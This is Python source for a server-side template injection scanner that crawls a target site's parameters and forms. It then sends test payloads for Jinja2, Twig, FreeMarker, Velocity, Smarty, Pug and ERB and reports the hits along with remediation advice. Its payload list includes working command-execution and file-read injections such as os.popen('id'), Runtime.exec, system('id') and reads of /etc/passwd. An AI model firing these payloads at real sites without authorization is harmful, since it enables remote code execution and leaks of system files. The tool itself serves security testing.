import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re
import time

class SSTIScanner:
    def __init__(self, url, args):
        self.url = url.rstrip('/')
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })
        
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        
        self.results = []
    
    # Template engine detection payloads
    SSTI_PAYLOADS = {
        'Jinja2 (Python/Django)': [
            '{{7*7}}', '{{7*\'7\'}}', '{{config}}', '{{self}}',
            '{{''.__class__.__mro__[2].__subclasses__()}}',
            '{{cycler.__init__.__globals__.os.popen("id").read()}}',
            '{{lipsum.__globals__["os"].popen("id").read()}}'
        ],
        'Twig (PHP/Symfony)': [
            '{{7*7}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}',
            '{{_self.env.getFilter("cat /etc/passwd")}}',
            '{{7*\'7\'}}'
        ],
        'FreeMarker (Java)': [
            '${7*7}', '${7*\'7\'}', '${"freemarker"}',
            '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toExternalForm()}'
        ],
        'Velocity (Java)': [
            '#set($x=7*7)$x', '#set($x="test")$x',
            '#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))'
        ],
        'Smarty (PHP)': [
            '{$smarty.version}', '{$7*7}', '{php}echo "test";{/php}'
        ],
        'Jade/Pug (Node.js)': [
            '#{7*7}', '#{function(){return "test"}()}', '!= function(){return "test"}()'
        ],
        'ERB (Ruby/Rails)': [
            '<%= 7*7 %>', '<%= system("id") %>', '<%= File.read("/etc/passwd") %>'
        ]
    }
    
    # Output detection patterns
    OUTPUT_PATTERNS = [
        (r'49', '7*7 = 49 - Math evaluation works'),
        (r'7777777', '7*\'7\' = 7777777 - String multiplication'),
        (r'freemarker', 'FreeMarker specific output'),
        (r'test', 'Function execution output'),
        (r'root:[x*]:0:0:', '/etc/passwd leak'),
        (r'uid=\d+\(', 'Command execution - id command'),
        (r'config|Config|CONFIG', 'Config object access'),
    ]
    
    def find_vectors(self):
        """Find potential SSTI input vectors"""
        vectors = []
        
        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # URL parameters
            parsed = urlparse(self.url)
            if parsed.query:
                for param in parsed.query.split('&'):
                    if '=' in param:
                        key, val = param.split('=', 1)
                        vectors.append({
                            'url': self.url,
                            'param': key,
                            'method': 'GET',
                            'current_value': val
                        })
            
            # Form inputs
            for form in soup.find_all('form'):
                action = form.get('action', '')
                action = urljoin(self.url, action) if action else self.url
                method = form.get('method', 'get').lower()
                
                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name')
                    if name and input_tag.get('type', 'text') not in ['submit', 'button', 'image']:
                        vectors.append({
                            'url': action,
                            'param': name,
                            'method': method
                        })
            
            # Common SSTI-prone parameters in URLs
            ssti_params = ['name', 'username', 'message', 'comment', 'search', 'q', 
                          'page', 'title', 'header', 'template', 'view',
                          'error', 'msg', 'subject', 'body', 'content']
            
            for param in ssti_params:
                vectors.append({
                    'url': self.url,
                    'param': param,
                    'method': 'GET'
                })
        
        except Exception:
            pass
        
        return vectors
    
    def test_ssti(self, vector):
        """Test for template injection"""
        for engine, payloads in self.SSTI_PAYLOADS.items():
            for payload in payloads:
                try:
                    test_params = {vector['param']: payload}
                    
                    if vector.get('method') == 'POST':
                        response = self.session.post(vector['url'], data=test_params, timeout=self.args.timeout)
                    else:
                        response = self.session.get(vector['url'], params=test_params, timeout=self.args.timeout)
                    
                    resp_text = response.text
                    
                    # Check for math evaluation (7*7 = 49)
                    if '49' in resp_text and '7*7' in payload:
                        # Verify it's actually evaluating, not just the string
                        if payload.replace('*', '') not in resp_text:  # No literal '7*7' in response
                            self.results.append({
                                'url': vector['url'],
                                'param': vector['param'],
                                'technique': f'SSTI - {engine}',
                                'payload': payload,
                                'severity': 'Critical',
                                'evidence': 'Template expression evaluated (7*7 = 49)',
                                'remediation': 'Never render user input as templates. Use output encoding.'
                            })
                            return True
                    
                    # Check for string multiplication (7*'7' = 7777777)
                    if '7777777' in resp_text:
                        self.results.append({
                            'url': vector['url'],
                            'param': vector['param'],
                            'technique': f'SSTI - {engine}',
                            'payload': payload,
                            'severity': 'Critical',
                            'evidence': 'String multiplication evaluated (7*\'7\' = 7777777)',
                            'remediation': 'Never render user input as templates. Use output encoding.'
                        })
                        return True
                    
                    # Check for config/object access
                    if 'config' in payload.lower() and ('<table' in resp_text or '{' in resp_text):
                        if len(resp_text) > 500:  # Config pages are usually large
                            self.results.append({
                                'url': vector['url'],
                                'param': vector['param'],
                                'technique': f'SSTI - {engine}',
                                'payload': payload,
                                'severity': 'Critical',
                                'evidence': 'Config object accessed - possible full disclosure',
                                'remediation': 'Never render user input as templates.'
                            })
                            return True
                    
                    # Check for special engine outputs
                    if 'freemarker' in resp_text and 'freemarker' in payload:
                        self.results.append({
                            'url': vector['url'],
                            'param': vector['param'],
                            'technique': 'SSTI - FreeMarker (Java)',
                            'payload': payload,
                            'severity': 'Critical',
                            'evidence': 'FreeMarker template evaluation detected',
                            'remediation': 'Never render user input as templates.'
                        })
                        return True
                    
                except Exception:
                    continue
        
        return False
    
    def scan(self):
        """Main SSTI scan"""
        print("    [*] Finding template injection vectors...")
        
        vectors = self.find_vectors()
        if not vectors:
            print("    [!] No SSTI vectors found")
            return self.results
        
        print(f"    [*] Testing {len(vectors)} vectors with {sum(len(p) for p in self.SSTI_PAYLOADS.values())} payloads...")
        print(f"    [*] Testing engines: {', '.join(self.SSTI_PAYLOADS.keys())}")
        
        for vector in vectors:
            if self.test_ssti(vector):
                print(f"    🚨 SSTI Found! Check payload '{self.results[-1]['payload'][:40]}...'")
        
        if self.results:
            print(f"\n    [!] Found {len(self.results)} SSTI vulnerabilities!")
        else:
            print("    [+] No template injection vulnerabilities detected")
        
        return self.results